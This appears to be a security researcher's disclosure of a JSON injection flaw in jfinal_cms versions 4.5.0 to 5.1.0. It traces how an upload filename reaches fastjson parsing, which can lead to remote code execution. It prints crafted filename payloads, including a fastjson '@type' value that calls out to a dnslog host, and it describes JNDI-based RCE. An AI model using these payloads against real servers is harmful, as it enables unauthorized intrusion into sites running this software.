# jfinal_cms has Json Injection vulnerability

#### TL;DR

`jfinal_cms` has a `json` injection vulnerability, which can lead to remote command execution in the foreground in most versions.

The reason is that the `com.baidu.ueditor.define.BaseState#toString` method processes the key-value pairs of Map through splicing. This vulnerability can be triggered through the `fastjson#parseObject` function after escaping the malicious attributes. This vulnerability exists in `v4.0.0~v.5.1.0` versions, the `dnslog` version that can be exploited is `v4.5.0~v.5.1.0`, and the `RCE` version is `v4.5.0~v.5.0.1`.

#### versions affected

`version affected`：`jfnal_cms v4.5.0~v5.1.0`

`RCE version(default)`:`jfnal_cms v4.5.0~v5.0.1(fastjson 1.2.28)`

#### find gadget

The `sink` point is `com.baidu.ueditor.define.BaseState#toString`. The main logic is to traverse the `map`, process the `key` and `value` and finally make it into a `JSON` string form.
Among them, `key` and `value` are spliced with `+`. If `key` or `value` is controllable, it may cause `json` injection problem.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg)

Looking up for `usage`, the `ActionEnter#invoke` method calls `state#toJSONString`. You can see that `Uploader#doExec` is triggered when `ActionMap` is an `UPLOAD_FILE` (file upload) operation.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png)

Let’s first look at the logic of `Uploader#doExec`. Here, different classes of `save` methods are called depending on whether `base64` is used. When the operation is `UPLOAD_FILE`, the `isBase64` of the configuration class `ConfigManager` is `false`, so `Uploader#doExec` triggers `BinaryUploader#save`.
```java
		case ActionMap.UPLOAD_FILE:
			conf.put("isBase64", "false");
			conf.put("maxSize", this.jsonConfig.getLong("fileMaxSize"));
			conf.put("allowFiles", this.getArray("fileAllowFiles"));
			conf.put("fieldName", this.jsonConfig.getString("fileFieldName"));
			savePath = this.jsonConfig.getString("filePathFormat");
			break;
```

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png)

Auditing the `BinaryUploader#save` function, you can see that `originFileName` is controlled by `filename` of the upload form. It is worth noting that the program (only) verifies the suffix name. Here, `filename` is `filename=flag ","vulnerable":"hacked","a":".txt` can be bypassed, and finally put `originFileName` into `Map`.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png)

Then trigger `toJSONString` to process the malicious characters into a string through splicing.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png)


Continuing to look up the exploit chain, we found that the above function call can be triggered through the `/ueditor` route, in which the returned `out` is a malicious string, and finally `out` is passed to `UeditorService#uploadHandle`.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868878079.png)

`UeditorService#uploadHandle` parses the malicious string through the `parseObject` method, and you can see that `json` has been contaminated.

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-5.png)

Unfortunately, after being able to pollute the `json` attribute, I did not find any actual harm caused by the attribute value overridden by pollution.

Therefore, we can only find ways to use `parseObject`. The first attribute of `json`, `"state":"SUCCESS`", is uncontrollable. A small `trick` is used here, let `filename` be `flag", {"@type":"java.net .Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt` can restore `Java Bean` normally.

Since the latest version of `v5.1.0` uses `fastjson` as `1.2.62` and does not have `autoType` enabled, as a novice I have not found a way to `RCE`. However, after testing, it was found that `v4.5.0~v5.0.1` all use `fastjson 1.2.28`, which can be bypassed by using cache. Just use `ldap` to create a `fastjson` full version deserialization chain `RCE`.

#### dnslog test
`DNS` testing is performed in `v4.5.0` version, run the test script.


`dnslog` received the request, proving that the vulnerability exists. It is worth noting that if the version is between `v4.5.0-v5.0.1`, two `DNS` requests will be initiated, because these versions use `fastjson` by default The version is `1.2.28`, so it can also be used as a fingerprint to determine whether it is exploitable.
![image-20230917132528175](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20230917132528175.png)

#### RCE test

`RCE` testing is conducted in `v5.0.1` version.

Run the `jndi` server.

![1694926217388](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926217388.png)

Run `exp.py` to `RCE`.

![1694926173785](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926173785.png)